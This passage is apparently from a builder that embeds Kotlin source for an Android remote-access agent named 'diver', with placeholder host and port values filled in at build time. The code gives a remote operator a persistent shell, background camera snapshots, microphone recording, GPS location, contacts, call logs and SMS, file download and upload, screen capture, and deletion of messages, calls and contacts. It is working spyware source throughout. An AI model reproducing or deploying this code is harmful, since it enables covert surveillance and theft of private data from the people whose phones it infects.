            private val shellOut = java.util.concurrent.ConcurrentLinkedQueue<String>()
            private val shellErr = java.util.concurrent.ConcurrentLinkedQueue<String>()

            private fun drainShell(reader: BufferedReader, queue: java.util.concurrent.ConcurrentLinkedQueue<String>) {
                try {
                    var line = reader.readLine()
                    while (line != null) {
                        queue.add(line)
                        line = reader.readLine()
                    }
                } catch (_: Exception) {}
            }

            private fun ensureShell() {
                val p = shellProc
                val dead = p == null || run { try { p!!.exitValue(); true } catch (_: Exception) { false } }
                if (dead) {
                    shellOut.clear()
                    shellErr.clear()
                    val proc = Runtime.getRuntime().exec(arrayOf("/system/bin/sh"))
                    thread(name = "diver-sh-out") { drainShell(proc.inputStream.bufferedReader(), shellOut) }
                    thread(name = "diver-sh-err") { drainShell(proc.errorStream.bufferedReader(), shellErr) }
                    shellProc = proc
                }
            }

            private fun runShell(cmd: String): String {
                synchronized(shellLock) {
                    try { ensureShell() } catch (e: Exception) { return "shell error: " + (e.message ?: "") }
                    val marker = "__DIVERDONE" + UUID.randomUUID().toString().replace("-", "") + "__"
                    try {
                        shellProc!!.outputStream.write((cmd + "\n").toByteArray(Charsets.UTF_8))
                        shellProc!!.outputStream.write(("echo " + marker + "\n").toByteArray(Charsets.UTF_8))
                        shellProc!!.outputStream.flush()
                    } catch (e: Exception) {
                        synchronized(shellLock) { shellProc = null }
                        return "shell error: " + (e.message ?: "")
                    }
                    val deadline = System.currentTimeMillis() + 20000
                    val out = StringBuilder()
                    var found = false
                    while (System.currentTimeMillis() < deadline && !found) {
                        var line = shellOut.poll()
                        while (line != null) {
                            if (line.contains(marker)) { found = true; break }
                            out.append(line).append('\n')
                            line = shellOut.poll()
                        }
                        if (found) break
                        line = shellErr.poll()
                        while (line != null) {
                            if (line.contains(marker)) { found = true; break }
                            out.append(line).append('\n')
                            line = shellErr.poll()
                        }
                        try { shellProc!!.exitValue(); break } catch (_: Exception) {}
                        Thread.sleep(40)
                    }
                    if (found) {
                        Thread.sleep(150)
                        var line = shellOut.poll()
                        while (line != null) {
                            if (!line.contains(marker)) out.append(line).append('\n')
                            line = shellOut.poll()
                        }
                        line = shellErr.poll()
                        while (line != null) {
                            if (!line.contains(marker)) out.append(line).append('\n')
                            line = shellErr.poll()
                        }
                        val text = out.toString().trim()
                        return if (text.isEmpty()) "(no output)" else text
                    }
                    return "(timed out) " + out.toString().trim()
                }
            }

            private fun listProcesses(): String {
                val arr = JSONArray()
                try {
                    val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", "ps -A -o PID,NAME 2>/dev/null || ps"))
                    val lines = proc.inputStream.bufferedReader().readText().lines()
                    for (l in lines.drop(1)) {
                        val parts = l.trim().split(Regex("\\s+"))
                        if (parts.size >= 2) {
                            val o = JSONObject()
                            o.put("pid", parts[0].toIntOrNull() ?: 0)
                            o.put("name", parts.subList(1, parts.size).joinToString(" "))
                            o.put("cpu", 0.0)
                            o.put("mem", 0.0)
                            o.put("title", "")
                            arr.put(o)
                        }
                    }
                    proc.waitFor()
                } catch (_: Exception) {}
                return arr.toString()
            }

            private fun listApps(): String {
                val arr = JSONArray()
                val pm = packageManager
                for (info in pm.getInstalledApplications(0)) {
                    val o = JSONObject()
                    o.put("name", pm.getApplicationLabel(info).toString())
                    o.put("version", "1.0")
                    o.put("publisher", info.packageName)
                    o.put("installed", "")
                    o.put("sizeMb", 0.0)
                    arr.put(o)
                }
                return arr.toString()
            }

            private fun getLocation(): String {
                val o = JSONObject()
                try {
                    val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                    var lat = 0.0
                    var lon = 0.0
                    var got = false
                    // Prefer GPS (accurate), then network, then passive / last-known from any enabled provider.
                    val providers = listOf(
                        android.location.LocationManager.GPS_PROVIDER,
                        android.location.LocationManager.NETWORK_PROVIDER,
                        android.location.LocationManager.PASSIVE_PROVIDER
                    )
                    for (p in providers) {
                        try {
                            if (!lm.isProviderEnabled(p)) continue
                            val loc = try { lm.getLastKnownLocation(p) } catch (_: SecurityException) { null }
                            if (loc != null && (loc.latitude != 0.0 || loc.longitude != 0.0)) {
                                lat = loc.latitude; lon = loc.longitude; got = true
                                break
                            }
                        } catch (_: Exception) {}
                    }
                    if (!got) {
                        // request a fresh fix from every enabled provider (network is fast/indoor-friendly)
                        val latch = java.util.concurrent.CountDownLatch(1)
                        val listener = object : android.location.LocationListener {
                            override fun onLocationChanged(loc: android.location.Location) {
                                if (loc.latitude != 0.0 || loc.longitude != 0.0) { lat = loc.latitude; lon = loc.longitude; got = true }
                                latch.countDown()
                            }
                            override fun onStatusChanged(p0: String?, p1: Int, p2: android.os.Bundle?) {}
                            override fun onProviderEnabled(p0: String) {}
                            override fun onProviderDisabled(p0: String) {}
                        }
                        try {
                            val enabled = providers.filter { run {
                                try { lm.isProviderEnabled(it) } catch (_: Exception) { false }
                            } }
                            for (p in enabled) {
                                try {
                                    @Suppress("MissingPermission")
                                    lm.requestSingleUpdate(p, listener, Looper.getMainLooper())
                                } catch (_: Exception) {}
                            }
                            if (enabled.isNotEmpty()) latch.await(10, java.util.concurrent.TimeUnit.SECONDS)
                            try { lm.removeUpdates(listener) } catch (_: Exception) {}
                        } catch (_: Exception) {}
                    }
                    o.put("status", if (got) "success" else "fail")
                    o.put("country", "")
                    o.put("city", "")
                    o.put("lat", lat)
                    o.put("lon", lon)
                    o.put("isp", "")
                    o.put("query", localIp())
                    if (!got) o.put("message", "no location fix yet - enable Location (GPS/network) on the device")
                } catch (e: Exception) {
                    o.put("status", "fail")
                    o.put("message", e.message ?: "no location")
                }
                return o.toString()
            }

            private val audioLock = Object()
            private val audioBuffer = java.io.ByteArrayOutputStream()
            private var audioRecord: android.media.AudioRecord? = null
            private var audioThread: Thread? = null

            private fun startRecording() {
                stopRecording()
                if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED)
                    throw Exception("RECORD_AUDIO permission not granted - launch the app on the device and allow the microphone permission")
                try { startForegroundInternal(screenShare = false, camera = true) } catch (_: Exception) {}
                val sampleRate = 16000
                val minBuf = android.media.AudioRecord.getMinBufferSize(sampleRate,
                    android.media.AudioFormat.CHANNEL_IN_MONO, android.media.AudioFormat.ENCODING_PCM_16BIT)
                if (minBuf <= 0) throw Exception("microphone not available on this device")
                val rec = android.media.AudioRecord(android.media.MediaRecorder.AudioSource.MIC,
                    sampleRate, android.media.AudioFormat.CHANNEL_IN_MONO, android.media.AudioFormat.ENCODING_PCM_16BIT,
                    Math.max(minBuf * 2, 3200))
                if (rec.state != android.media.AudioRecord.STATE_INITIALIZED) {
                    try { rec.release() } catch (_: Exception) {}
                    throw Exception("microphone failed to initialize (permission denied?)")
                }
                audioRecord = rec
                synchronized(audioLock) { audioBuffer.reset() }
                try { rec.startRecording() } catch (e: Exception) {
                    try { rec.release() } catch (_: Exception) {}
                    audioRecord = null
                    throw Exception("start recording failed: " + (e.message ?: "mic error"))
                }
                if (rec.recordingState != android.media.AudioRecord.RECORDSTATE_RECORDING) {
                    try { rec.release() } catch (_: Exception) {}
                    audioRecord = null
                    throw Exception("microphone not recording - it may be in use by another app")
                }
                audioThread = thread(name = "diver-audio") {
                    val buf = ByteArray(4096)
                    while (true) {
                        val n = try { rec.read(buf, 0, buf.size) } catch (_: Exception) { -1 }
                        if (n <= 0) break
                        synchronized(audioLock) {
                            if (audioBuffer.size() > 3_000_000) audioBuffer.reset()
                            audioBuffer.write(buf, 0, n)
                        }
                    }
                }
            }

            private fun getRecordedAudio(): String? {
                synchronized(audioLock) {
                    if (audioBuffer.size() == 0) return null
                    val pcm = audioBuffer.toByteArray()
                    audioBuffer.reset()
                    return android.util.Base64.encodeToString(buildWav(pcm), android.util.Base64.NO_WRAP)
                }
            }

            private fun stopRecording() {
                try { audioThread?.interrupt() } catch (_: Exception) {}
                audioThread = null
                try { audioRecord?.stop() } catch (_: Exception) {}
                try { audioRecord?.release() } catch (_: Exception) {}
                audioRecord = null
                synchronized(audioLock) { audioBuffer.reset() }
            }

            private fun buildWav(pcm: ByteArray): ByteArray {
                val sampleRate = 16000
                val baos = java.io.ByteArrayOutputStream()
                val d = java.io.DataOutputStream(baos)
                d.writeBytes("RIFF")
                d.writeInt(36 + pcm.size)
                d.writeBytes("WAVE")
                d.writeBytes("fmt ")
                d.writeInt(16)
                d.writeShort(1)
                d.writeShort(1)
                d.writeInt(sampleRate)
                d.writeInt(sampleRate * 2)
                d.writeShort(2)
                d.writeShort(16)
                d.writeBytes("data")
                d.writeInt(pcm.size)
                d.write(pcm)
                d.flush()
                return baos.toByteArray()
            }

            private fun captureCamera(): String {
                // Promote the foreground service to include the camera type so the camera
                // can be used while the app is in the background (Android 14+ requirement)
                try { startForegroundInternal(screenShare = false, camera = true) } catch (_: Exception) {}
                return try {
                    val cm = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
                    if (cm.cameraIdList.isEmpty()) return "camera error (no cameras)"
                    val camId = cm.cameraIdList.firstOrNull { it.contains("0") } ?: cm.cameraIdList[0]
                    var result = ""
                    val latch = java.util.concurrent.CountDownLatch(1)
                    val handlerThread = android.os.HandlerThread("camera").also { it.start() }
                    val camHandler = android.os.Handler(handlerThread.looper)
                    val imageReader = android.media.ImageReader.newInstance(640, 480, android.graphics.PixelFormat.JPEG, 2)
                    val cameraCallback = object : android.hardware.camera2.CameraDevice.StateCallback() {
                        override fun onOpened(camera: android.hardware.camera2.CameraDevice) {
                            try {
                                val captureBuilder = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE)
                                captureBuilder.addTarget(imageReader.surface)
                                captureBuilder.set(android.hardware.camera2.CaptureRequest.JPEG_QUALITY, 80.toByte())
                                camera.createCaptureSession(listOf(imageReader.surface), object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                        session.capture(captureBuilder.build(), null, camHandler)
                                    }
                                    override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) { latch.countDown() }
                                }, camHandler)
                            } catch (e: Exception) { latch.countDown() }
                        }
                        override fun onDisconnected(camera: android.hardware.camera2.CameraDevice) { latch.countDown() }
                        override fun onError(camera: android.hardware.camera2.CameraDevice, error: Int) { latch.countDown() }
                    }
                    imageReader.setOnImageAvailableListener({ reader ->
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            try {
                                val buffer = image.planes[0].buffer
                                val bytes = ByteArray(buffer.remaining())
                                buffer.get(bytes)
                                result = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                            } catch (_: Exception) {}
                            image.close()
                        }
                        latch.countDown()
                    }, camHandler)
                    @Suppress("DEPRECATION") cm.openCamera(camId, cameraCallback, camHandler)
                    latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
                    try { handlerThread.quitSafely() } catch (_: Exception) {}
                    if (result.isEmpty()) "camera error (no frame)" else result
                } catch (e: Exception) { "camera error: " + (e.message ?: "") }
            }

            private fun listDir(path: String): String {
                val root = JSONObject()
                val entries = JSONArray()
                var error = ""
                try {
                    val dir = java.io.File(path)
                    root.put("path", if (dir.exists() && dir.isDirectory) dir.absolutePath else path)
                    if (dir.exists() && dir.isDirectory) {
                        val files = try { dir.listFiles() } catch (e: Exception) { null }
                        if (files != null) {
                            for (f in files) {
                                val o = JSONObject()
                                o.put("name", f.name)
                                o.put("kind", if (f.isDirectory) "Folder" else "File")
                                o.put("size", f.length())
                                entries.put(o)
                            }
                        } else {
                            error = "Cannot read folder - enable All Files Access on the device"
                        }
                    } else {
                        error = "Folder not found"
                    }
                } catch (e: Exception) {
                    error = e.message ?: "error reading folder"
                }
                if (error.isEmpty() && Build.VERSION.SDK_INT >= 30 &&
                    path.startsWith("/storage/") && !android.os.Environment.isExternalStorageManager()) {
                    error = "All Files Access is not granted on the device - enable it in Settings"
                }
                root.put("entries", entries)
                if (error.isNotEmpty()) root.put("error", error)
                return root.toString()
            }

            private fun listDrives(): String {
                val arr = JSONArray()
                try {
                    // Primary internal storage
                    val primary = android.os.Environment.getExternalStorageDirectory()
                    val o = JSONObject()
                    o.put("path", primary.absolutePath)
                    o.put("name", "Internal Storage (" + primary.absolutePath + ")")
                    o.put("type", "Internal")
                    arr.put(o)
                    // Scan /storage for additional volumes (SD card / USB OTG)
                    val storageDir = java.io.File("/storage")
                    for (v in storageDir.listFiles() ?: emptyArray()) {
                        if (v.name == "emulated" || v.name.startsWith("self")) continue
                        val o2 = JSONObject()
                        o2.put("path", v.absolutePath)
                        o2.put("name", "Removable Storage (" + v.absolutePath + ")")
                        o2.put("type", "Removable")
                        arr.put(o2)
                    }
                } catch (_: Exception) {}
                if (arr.length() == 0) {
                    val o = JSONObject()
                    val storage = android.os.Environment.getExternalStorageDirectory()
                    o.put("path", storage.absolutePath)
                    o.put("name", "Internal Storage (" + storage.absolutePath + ")")
                    o.put("type", "Internal")
                    arr.put(o)
                }
                return arr.toString()
            }

            private fun listContacts(): String {
                val arr = JSONArray()
                try {
                    val uri = android.provider.ContactsContract.Contacts.CONTENT_URI
                    val cursor = contentResolver.query(uri, null, null, null, null)
                    cursor?.use {
                        val nameIdx = it.getColumnIndex(android.provider.ContactsContract.Contacts.DISPLAY_NAME)
                        val idIdx = it.getColumnIndex(android.provider.ContactsContract.Contacts._ID)
                        val hasNumIdx = it.getColumnIndex(android.provider.ContactsContract.Contacts.HAS_PHONE_NUMBER)
                        while (it.moveToNext()) {
                            val id = if (idIdx >= 0) it.getString(idIdx) else ""
                            val name = if (nameIdx >= 0) it.getString(nameIdx) ?: "" else ""
                            val hasNumber = if (hasNumIdx >= 0) it.getInt(hasNumIdx) > 0 else false
                            var number = ""
                            if (hasNumber && idIdx >= 0) {
                                val numUri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                                val numCursor = contentResolver.query(
                                    numUri, null,
                                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                                    arrayOf(id), null
                                )
                                numCursor?.use {
                                    val numCol = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                                    if (it.moveToFirst() && numCol >= 0) number = it.getString(numCol) ?: ""
                                }
                            }
                            val o = JSONObject()
                            o.put("id", id)
                            o.put("name", name)
                            o.put("number", number)
                            arr.put(o)
                        }
                    }
                } catch (e: Exception) {
                    throw e
                }
                return arr.toString()
            }

            private fun listCalls(): String {
                val arr = JSONArray()
                try {
                    val uri = android.provider.CallLog.Calls.CONTENT_URI
                    val cursor = contentResolver.query(uri, null, null, null, android.provider.CallLog.Calls.DATE + " DESC")
                    cursor?.use {
                        val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                        val nameIdx = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
                        val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                        val dateIdx = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
                        val durIdx = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                        val idIdx = it.getColumnIndex(android.provider.CallLog.Calls._ID)
                        while (it.moveToNext()) {
                            val o = JSONObject()
                            o.put("id", if (idIdx >= 0) it.getString(idIdx) ?: "" else "")
                            o.put("number", if (numIdx >= 0) it.getString(numIdx) ?: "" else "")
                            o.put("name", if (nameIdx >= 0) it.getString(nameIdx) ?: "" else "")
                            o.put("type", if (typeIdx >= 0) it.getInt(typeIdx) else 0)
                            o.put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                            o.put("duration", if (durIdx >= 0) it.getLong(durIdx) else 0L)
                            arr.put(o)
                        }
                    }
                } catch (e: Exception) {
                    throw e
                }
                return arr.toString()
            }

            private fun listSms(): String {
                val arr = JSONArray()
                try {
                    val uri = android.provider.Telephony.Sms.Inbox.CONTENT_URI
                    val cursor = contentResolver.query(uri, null, null, null, android.provider.Telephony.Sms.Inbox.DATE + " DESC")
                    cursor?.use {
                        val addrIdx = it.getColumnIndex("address")
                        val bodyIdx = it.getColumnIndex("body")
                        val dateIdx = it.getColumnIndex("date")
                        val readIdx = it.getColumnIndex("read")
                        val idIdx = it.getColumnIndex("_id")
                        while (it.moveToNext()) {
                            val o = JSONObject()
                            o.put("id", if (idIdx >= 0) it.getString(idIdx) ?: "" else "")
                            o.put("from", if (addrIdx >= 0) it.getString(addrIdx) ?: "" else "")
                            o.put("body", if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else "")
                            o.put("date", if (dateIdx >= 0) it.getLong(dateIdx) else 0L)
                            o.put("read", if (readIdx >= 0) it.getInt(readIdx) > 0 else true)
                            arr.put(o)
                        }
                    }
                } catch (e: Exception) {
                    throw e
                }
                return arr.toString()
            }

            private fun deleteContact(id: String): String {
                if (id.isEmpty()) throw Exception("no contact id")
                val uri = android.provider.ContactsContract.Contacts.CONTENT_URI
                val deleted = contentResolver.delete(uri, android.provider.ContactsContract.Contacts._ID + "=?", arrayOf(id))
                return "deleted $deleted contact(s)"
            }

            private fun deleteCall(id: String): String {
                if (id.isEmpty()) throw Exception("no call log id")
                val deleted = contentResolver.delete(android.provider.CallLog.Calls.CONTENT_URI,
                    android.provider.CallLog.Calls._ID + "=?", arrayOf(id))
                return "deleted $deleted call(s)"
            }

            private fun deleteSms(id: String): String {
                if (id.isEmpty()) throw Exception("no sms id")
                val deleted = contentResolver.delete(android.provider.Telephony.Sms.CONTENT_URI,
                    android.provider.Telephony.Sms._ID + "=?", arrayOf(id))
                return "deleted $deleted message(s)"
            }

            private fun uninstallApp(pkg: String): String {
                if (pkg.isEmpty()) throw Exception("no package name")
                val intent = android.content.Intent(android.content.Intent.ACTION_DELETE,
                    android.net.Uri.parse("package:$pkg")).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                return "uninstall dialog opened on device for $pkg"
            }

            private fun listCams(): String {
                val arr = JSONArray()
                try {
                    val cm = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
                    for (i in cm.cameraIdList.indices) {
                        val o = JSONObject()
                        o.put("index", i)
                        o.put("name", "Camera " + cm.cameraIdList[i])
                        arr.put(o)
                    }
                } catch (_: Exception) {}
                if (arr.length() == 0) {
                    val o = JSONObject()
                    o.put("index", 0)
                    o.put("name", "Camera 0")
                    arr.put(o)
                }
                return arr.toString()
            }

            private fun listMics(): String {
                val arr = JSONArray()
                val o = JSONObject()
                o.put("index", 0)
                o.put("name", "Default Microphone")
                arr.put(o)
                return arr.toString()
            }

            private fun listScreens(): String {
                val arr = JSONArray()
                try {
                    val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
                    val metrics = android.util.DisplayMetrics()
                    wm.defaultDisplay.getMetrics(metrics)
                    val o = JSONObject()
                    o.put("index", 0)
                    o.put("name", "Screen")
                    o.put("width", metrics.widthPixels)
                    o.put("height", metrics.heightPixels)
                    o.put("primary", true)
                    arr.put(o)
                } catch (_: Exception) {
                    val o = JSONObject()
                    o.put("index", 0)
                    o.put("name", "Screen")
                    o.put("width", 1080)
                    o.put("height", 2400)
                    o.put("primary", true)
                    arr.put(o)
                }
                return arr.toString()
            }

            private fun downloadFile(path: String): String {
                return try {
                    val f = java.io.File(path)
                    if (!f.exists() || !f.isFile) throw Exception("not found")
                    android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)
                } catch (e: Exception) { throw e }
            }

            private fun uploadFile(path: String, dataB64: String): String {
                try {
                    val bytes = android.util.Base64.decode(dataB64, android.util.Base64.DEFAULT)
                    java.io.File(path).writeBytes(bytes)
                    return "written to $path"
                } catch (e: Exception) { throw e }
            }

            private fun listMedia(type: String): String {
                val arr = JSONArray()
                try {
                    val uri = when (type) {
                        "videos" -> android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                        "audio" -> android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
                        else -> android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                    }
                    val cursor = contentResolver.query(uri, null, null, null, null)
                    cursor?.use {
                        val nameIdx = it.getColumnIndex(android.provider.MediaStore.MediaColumns.DISPLAY_NAME)
                        val dataIdx = it.getColumnIndex(android.provider.MediaStore.MediaColumns.DATA)
                        val sizeIdx = it.getColumnIndex(android.provider.MediaStore.MediaColumns.SIZE)
                        while (it.moveToNext()) {
                            val o = JSONObject()
                            o.put("name", if (nameIdx >= 0) it.getString(nameIdx) else "")
                            o.put("path", if (dataIdx >= 0) it.getString(dataIdx) else "")
                            o.put("size", if (sizeIdx >= 0) it.getLong(sizeIdx) else 0L)
                            arr.put(o)
                        }
                    }
                } catch (_: Exception) {}
                return arr.toString()
            }

            private fun captureScreen(): String {
                return try {
                    if (ScreenShare.active) {
                        ScreenShare.lastJpeg ?: "no frame yet"
                    } else {
                        if (!ScreenShare.pending) {
                            ScreenShare.pending = true
                            val intent = android.content.Intent(this, ScreenCaptureActivity::class.java).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                        "waiting for screen share permission on device"
                    }
                } catch (e: Exception) { e.message ?: "screen error" }
            }

            private fun openUrl(url: String) {
                val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url)).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }

            private fun toast(text: String) {
                handler.post { Toast.makeText(this, text, Toast.LENGTH_LONG).show() }
            }

            private fun localIp(): String {
                return try {
                    java.net.NetworkInterface.getNetworkInterfaces().toList().asSequence()
                        .flatMap { it.inetAddresses.asSequence() }
                        .firstOrNull { !it.isLoopbackAddress && it is java.net.Inet4Address }
                        ?.hostAddress ?: "127.0.0.1"
                } catch (_: Exception) {
                    "127.0.0.1"
                }
            }

            private fun loadId(): String {
                val prefs = getSharedPreferences("diver", 0)
                var id = prefs.getString("id", null)
                if (id == null) {
                    id = UUID.randomUUID().toString().replace("-", "")
                    prefs.edit().putString("id", id).apply()
                }
                return id
            }

            companion object {
                private const val CHANNEL_ID = "diver_agent"
                private const val HOST = "%%IP%%"
                private const val PORT = %%PORT%%
                private const val HEARTBEAT_MS = 5000L
                @Volatile var instance: AgentService? = null
            }

            fun promoteToScreenCast() {
                startForegroundInternal(screenShare = true)
            }
        }

        object ScreenShare {
            @Volatile var lastJpeg: String? = null
            @Volatile var active = false
            @Volatile var pending = false
            private var projection: android.media.projection.MediaProjection? = null
            private var virtualDisplay: android.hardware.display.VirtualDisplay? = null
            private var reader: android.media.ImageReader? = null
            private var width = 720
            private var height = 1280

            fun start(context: Context, resultCode: Int, data: Intent) {
                try {
                    stop()
                    val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
                    val proj = mpm.getMediaProjection(resultCode, data)
                    if (proj == null) return
                    // Register the callback BEFORE starting capture (Android 14+ requirement)
                    proj.registerCallback(object : android.media.projection.MediaProjection.Callback() {
                        override fun onStop() { stop() }
                    }, Handler(Looper.getMainLooper()))
                    val wm = context.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
                    val metrics = android.util.DisplayMetrics()
                    wm.defaultDisplay.getMetrics(metrics)
                    width = metrics.widthPixels
                    height = metrics.heightPixels
                    val dpi = metrics.densityDpi
                    val r = android.media.ImageReader.newInstance(width, height, android.graphics.PixelFormat.RGBA_8888, 2)
                    r.setOnImageAvailableListener({ rr ->
                        val img = rr.acquireLatestImage()
                        if (img != null) {
                            try {
                                val planes = img.planes[0]
                                val buf = planes.buffer
                                val pixelStride = planes.pixelStride
                                val rowStride = planes.rowStride
                                val rowPad = rowStride - pixelStride * width
                                val bmp = android.graphics.Bitmap.createBitmap(width + rowPad / pixelStride, height, android.graphics.Bitmap.Config.ARGB_8888)
                                bmp.copyPixelsFromBuffer(buf)
                                val crop = android.graphics.Bitmap.createBitmap(bmp, 0, 0, width, height)
                                val baos = java.io.ByteArrayOutputStream()
                                crop.compress(android.graphics.Bitmap.CompressFormat.JPEG, 55, baos)
                                lastJpeg = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
                            } catch (_: Exception) {}
                            img.close()
                        }
                    }, Handler(Looper.getMainLooper()))
                    val vd = proj.createVirtualDisplay("diver-screen", width, height, dpi,
                        android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, r.surface, null, null)
                    projection = proj
                    virtualDisplay = vd
                    reader = r
                    active = true
                    AgentService.instance?.promoteToScreenCast()
                } catch (_: Exception) {}
            }

            fun stop() {
                try { virtualDisplay?.release() } catch (_: Exception) {}
                try { reader?.close() } catch (_: Exception) {}
                try { projection?.stop() } catch (_: Exception) {}
                virtualDisplay = null
                reader = null
                projection = null
                lastJpeg = null
                active = false
            }
        }
        """";
    }
}